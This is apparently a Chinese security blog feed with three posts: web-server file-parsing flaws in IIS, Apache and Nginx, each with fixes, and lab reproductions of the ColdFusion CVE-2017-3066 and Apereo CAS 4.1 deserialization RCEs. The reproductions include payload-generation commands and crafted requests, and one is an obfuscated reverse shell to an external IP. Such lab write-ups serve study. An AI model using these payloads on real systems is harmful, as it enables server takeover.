title="修复建议"></a>修复建议</h3><p>由于微软并不认为这是一个漏洞，也没有推出<code>IIS 6.0</code>的补丁，因此漏洞需要自己修复。</p><ol><li>限制上传目录执行权限，不允许执行脚本。</li></ol><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101204.png" alt="image"></p><ol start="2"><li>不允许新建目录。</li><li>上传的文件需经过重命名(时间戳+随机数+.jpg等)</li></ol><h2 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h2><h3 id="IIS-7-x解析漏洞"><a href="#IIS-7-x解析漏洞" class="headerlink" title="IIS 7.x解析漏洞"></a>IIS 7.x解析漏洞</h3><p><code>IIS7.x</code>版本在<code>Fast-CGI</code>运行模式下,在任意文件，例：<code>test.jpg</code>后面加上<code>/.php</code>，会将<code>test.jpg</code>解析为<code>php</code>文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.x.x&#x2F;test.jpg&#x2F;.php</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101205.png" alt="image"></p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>配置<code>php.ini</code>中的<code>cgi.fix_pathinfo</code>为0并重启<code>php-cgi</code>程序</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101206.png" alt="image"></p><p>结果如下：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101207.png" alt="image"></p><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><p><code>Apache</code>是世界使用排名第一的<code>Web</code>服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的<code>API</code>扩充，将<code>Perl/Python</code>等解释器编译到服务器中。</p><h2 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h2><p><code>Apache</code>的解析漏洞依赖于一个特性： <strong>Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，直到识别到合法后缀才进行解析。</strong></p><p>访问<code>phpinfo.php.xxx</code></p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101208.png" alt="image"></p><p>实战中可以上传<code>rar</code>，<code>owf</code>等文件进行利用，如果上传<code>phpinfo.php.jpg</code>，即使文件名中有<code>.php</code>，也会直接解析为<code>jpg</code>。因为<code>Apache</code>认识<code>.jpg</code>,停止继续向左识别。</p><h2 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h2><p>如果运维人员给<code>.php</code>后缀增加了处理器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php .php</span><br></pre></td></tr></table></figure><p>那么，在有多个后缀的情况下，只要一个文件名中含有<code>.php</code>后缀，即被识别成<code>PHP</code>文件，没必要是最后一个后缀。<br>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101209.png" alt="image"></p><p>即使最右边的文件格式是在<code>mime.types</code>文件内，只要文件名中出现<code>.php</code>，就直接被解析为<code>php</code>。</p><h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>影响范围：2.4.0~2.4.29版本</p><p>环境：phpstudy2014 Apache + PHP5.4n</p><p>此漏洞形成的根本原因，在于<code>$</code>, 正则表达式中<code>$</code>不仅匹配字符串结尾位置，也可以匹配<code>\n</code> 或<code>\r</code></p><p>在解析<code>PHP</code>时，<code>1.php\x0A</code>将被按照<code>PHP</code>后缀进行解析，导致绕过一些服务器的安全策略。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>测试代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;上传文件&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">    $name &#x3D; basename($_POST[&#39;name&#39;]);</span><br><span class="line">    $ext &#x3D; pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    if(in_array($ext, [&#39;php&#39;, &#39;php3&#39;, &#39;php4&#39;, &#39;php5&#39;, &#39;phtml&#39;, &#39;pht&#39;])) &#123;</span><br><span class="line">        exit(&#39;bad file&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">echo &quot;ok&quot;;</span><br><span class="line">    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#39;.&#x2F;&#39; . $name);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101210.png" alt="image"></p><p>点击Go后，效果如下:</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101211.png" alt="image"></p><p>相同代码在Linux下进行测试，可以正常写入。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101212.png" alt="image"></p><p>访问：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101213.png" alt="image"></p><p>限制：获取文件名时不能用<code>$_FILES[‘file’][‘name’]</code>，因为它会自动把换行去掉。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101214.png" alt="image"></p><h2 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h2><ol><li>升级到最新版本</li><li>或将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</li></ol><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p><code>Nginx</code>是一款轻量级的<code>Web</code> 服务器/反向代理服务器及电子邮件<code>（IMAP/POP3）</code>代理服务器，在<code>BSD-like</code> 协议下发行。其特点是占有内存少，并发能力强，事实上<code>nginx</code>的并发能力确实在同类型的网页服务器中表现较好</p><h2 id="Nginx配置文件错误导致的解析漏洞"><a href="#Nginx配置文件错误导致的解析漏洞" class="headerlink" title="Nginx配置文件错误导致的解析漏洞"></a>Nginx配置文件错误导致的解析漏洞</h2><p>对于任意文件名，在后面添加<code>/xxx.php</code>（xxx为任意字符）后,即可将文件作为<code>php</code>解析。</p><p>例：<code>info.jpg</code>后面加上<code>/xxx.php</code>，会将<code>info.jpg</code> 以<code>php</code>解析。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101215.png" alt="image"></p><p>该漏洞是<code>Nginx</code>配置所导致，与<code>Nginx</code>版本无关，下面是常见的漏洞配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        root           &#x2F;work&#x2F;www&#x2F;test;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME    </span><br><span class="line">$document_root$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">        fastcgi_pass   unix:&#x2F;tmp&#x2F;php-fpm.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当攻击者访问<code>/info.jpg/xxx.php</code>时， <code>Nginx</code>将查看<code>URL</code>，看到它以<code>.php</code>结尾，并将路径传递给<code>PHP fastcgi</code>处理程序。</p><p><code>Nginx</code>传给<code>php</code>的路径为<code>c:/WWW/info.jpg/xxx.php</code>,<br>在<code>phpinfo</code>中可以查看<code>_SERVER[&quot;ORIG_SCRIPT_FILENAME&quot;]</code>得到。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101216.png" alt="image"></p><h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>配置<code>php.ini</code>中的<code>cgi.fix_pathinfo</code>为0并重启<code>php-cgi</code>程序</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101206.png" alt="image"></p><p>结果如下：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101207.png" alt="image"></p><p>如果需要使用到<code>cgi.fix_pathinfo</code>这个特性（例如：<code>Wordpress</code>），那么可以禁止上传目录的执行脚本权限。<br>或将上传存储的内容与网站分离，即站库分离。</p><p>或高版本<code>PHP</code>提供了<code>security.limit_extensions</code>这个配置参数，设置<code>security.limit_extensions = .php</code></p><hr><p>转载自<a href="https://www.lxhsec.com/2019/03/04/middleware/">lxhsec</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;IIS&quot;&gt;&lt;a href=&quot;#IIS&quot; class=&quot;headerlink&quot; title=&quot;IIS&quot;&gt;&lt;/a&gt;IIS&lt;/h1&gt;&lt;p&gt;&lt;code&gt;IIS&lt;/code&gt;是&lt;code&gt;Internet Information Services&lt;/code&gt;的缩写，意为互联网信息服务，是由微软公司提供的基于运行&lt;code&gt;Microsoft Windows&lt;/code&gt;的互联网基本服务。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;IIS目前只适用于Windows系统，不适用于其他操作系统。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;IIS-6-x&quot;&gt;&lt;a href=&quot;#IIS-6-x&quot; class=&quot;headerlink&quot; title=&quot;IIS 6.x&quot;&gt;&lt;/a&gt;IIS 6.x&lt;/h2&gt;&lt;h3 id=&quot;文件名解析漏洞&quot;&gt;&lt;a href=&quot;#文件名解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件名解析漏洞&quot;&gt;&lt;/a&gt;文件名解析漏洞&lt;/h3&gt;&lt;p&gt;该版本默认会将&lt;code&gt;*.asp;.jpg&lt;/code&gt;此种格式的文件名，当成&lt;code&gt;Asp&lt;/code&gt;解析，原理是 服务器默认不解析&lt;code&gt;;&lt;/code&gt;号及其后面的内容，相当于截断。&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;192.168.x.x&amp;#x2F;test.asp;.jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101201.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;文件夹名解析漏洞&quot;&gt;&lt;a href=&quot;#文件夹名解析漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件夹名解析漏洞&quot;&gt;&lt;/a&gt;文件夹名解析漏洞&lt;/h3&gt;&lt;p&gt;该版本默认会将&lt;code&gt;*.asp/&lt;/code&gt;目录下的所有文件当成&lt;code&gt;Asp&lt;/code&gt;解析。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="Web基础" scheme="https://hzktester.top/categories/Web%E5%9F%BA%E7%A1%80/"/>
+    
+    
+    <category term="中间件" scheme="https://hzktester.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</title>
+    <link href="https://hzktester.top/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/"/>
+    <id>https://hzktester.top/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89/</id>
+    <published>2020-10-10T08:34:00.000Z</published>
+    <updated>2020-10-10T08:53:37.695Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>Adobe ColdFusion</code>是美国<code>Adobe</code>公司的一款动态Web服务器产品，其运行的<code>CFML（ColdFusion Markup Language）</code>是针对Web应用的一种程序设计语言。</p><p><code>Adobe ColdFusion</code>中存在<code>java</code>反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：<code>Adobe ColdFusion (2016 release) Update 3</code>及之前的版本，<code>ColdFusion 11 Update 11</code>及之前的版本，<code>oldFusion 10 Update 22</code>及之前的版本。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>使用<code>vulhub</code>启动漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;vulhub&#x2F;coldfusion&#x2F;CVE-2017-3066&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>等待数分钟时间，环境启动成功，访问<code>http://your-ip:8500/CFIDE/administrator/index.cfm</code>，输入密码<code>vulhub</code>，即可成功安装<code>Adobe ColdFusion</code></p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101013.png" alt="image"></p><p>安装成功后页面如下：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101014.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用<a href="https://github.com/codewhitesec/ColdFusionPwn">ColdFusionPwn</a>工具来生成POC：</p><p>同时获取最新版的<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial</a>。放在同一目录下</p><p>生成POC（执行命令<code>touch /tmp/success</code>）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;touch &#x2F;tmp&#x2F;success&#39; poc.ser</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101015.png" alt="image"></p><p>POC生成于<code>poc.ser</code>文件中，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，<code>Content-Type</code>为<code>application/x-amf</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;flex2gateway&#x2F;amf HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8500</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-amf</span><br><span class="line">Content-Length: 2853</span><br><span class="line"></span><br><span class="line">[...poc...]</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101016.png" alt="image"></p><p>进入容器中，发现<code>/tmp/success</code>已成功创建：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101017.png" alt="image"></p><p>接下来试一下反弹<code>shell</code>（生成一个反弹shell的poc）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjIuMjAvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39; shell.ser</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101018.png" alt="image"></p><p>使用<code>curl</code>命令提交poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;47.101.62.20:8500&#x2F;flex2gateway&#x2F;amf --data-binary @shell.ser</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101019.png" alt="image"></p><p>成功反弹shell：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101020.png" alt="image"></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Adobe ColdFusion&lt;/code&gt;是美国&lt;code&gt;Adobe&lt;/code&gt;公司的一款动态Web服务器产品，其运行的&lt;code&gt;CFML（ColdFusion Markup Language）&lt;/code&gt;是针对Web应用的一种程序设计语言。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Adobe ColdFusion&lt;/code&gt;中存在&lt;code&gt;java&lt;/code&gt;反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：&lt;code&gt;Adobe ColdFusion (2016 release) Update 3&lt;/code&gt;及之前的版本，&lt;code&gt;ColdFusion 11 Update 11&lt;/code&gt;及之前的版本，&lt;code&gt;oldFusion 10 Update 22&lt;/code&gt;及之前的版本。&lt;/p&gt;
+&lt;h2 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h2&gt;&lt;p&gt;使用&lt;code&gt;vulhub&lt;/code&gt;启动漏洞环境&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;root&amp;#x2F;vulhub&amp;#x2F;coldfusion&amp;#x2F;CVE-2017-3066&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;等待数分钟时间，环境启动成功，访问&lt;code&gt;http://your-ip:8500/CFIDE/administrator/index.cfm&lt;/code&gt;，输入密码&lt;code&gt;vulhub&lt;/code&gt;，即可成功安装&lt;code&gt;Adobe ColdFusion&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101013.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
+&lt;p&gt;安装成功后页面如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101014.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="Adobe ColdFusion" scheme="https://hzktester.top/tags/Adobe-ColdFusion/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Apereo CAS 4.1 反序列化命令执行漏洞</title>
+    <link href="https://hzktester.top/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apereo%20CAS%204.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+    <id>https://hzktester.top/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Apereo%20CAS%204.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
+    <published>2020-10-10T03:40:00.000Z</published>
+    <updated>2020-10-10T08:53:41.379Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><code>Apereo CAS</code>是一款<code>Apereo</code>发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<code>vulhub</code>启动漏洞环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;vulhub&#x2F;apereo-cas&#x2F;4.1-rce&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080/cas/login</code>即可查看到登录页面。</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101009.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞原理是<code>Webflow</code>中使用了默认密钥<code>changeit</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class EncryptedTranscoder implements Transcoder &#123;</span><br><span class="line">    private CipherBean cipherBean;</span><br><span class="line">    private boolean compression &#x3D; true;</span><br><span class="line"></span><br><span class="line">    public EncryptedTranscoder() throws IOException &#123;</span><br><span class="line">        BufferedBlockCipherBean bufferedBlockCipherBean &#x3D; new BufferedBlockCipherBean();</span><br><span class="line">        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec(&quot;AES&quot;, &quot;CBC&quot;, &quot;PKCS7&quot;));</span><br><span class="line">        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());</span><br><span class="line">        bufferedBlockCipherBean.setKeyAlias(&quot;aes128&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setKeyPassword(&quot;changeit&quot;);</span><br><span class="line">        bufferedBlockCipherBean.setNonce(new RBGNonce());</span><br><span class="line">        this.setCipherBean(bufferedBlockCipherBean);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure><p>我们使用<a href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>来复现这个漏洞。使用<code>ysoserial</code>的<code>CommonsCollections4</code>生成加密后的<code>Payload</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 &quot;touch &#x2F;tmp&#x2F;success&quot;</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101010.png" alt="image"></p><p>然后登录<code>CAS</code>并抓包，将<code>Body</code>中的<code>execution</code>值替换成上面生成的<code>Payload</code>发送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cas&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Length: 2287</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;your-ip:8080</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;84.0.4147.89 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;your-ip:8080&#x2F;cas&#x2F;login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8</span><br><span class="line">Cookie: JSESSIONID&#x3D;24FB4BAAE1A66E8B76D521EE366B3E12; _ga&#x3D;GA1.1.1139210877.1586367734</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username&#x3D;test&amp;password&#x3D;test&amp;lt&#x3D;LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&amp;execution&#x3D;[payload]&amp;_eventId&#x3D;submit&amp;submit&#x3D;LOGIN</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101011.png" alt="image"></p><p>进入容器，可见<code>touch /tmp/success</code>已成功执行：</p><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020101012.png" alt="image"></p><p>反弹<code>shell</code>只需将<code>touch /tmp/success</code>替换即可</p>]]></content>
+    
+    
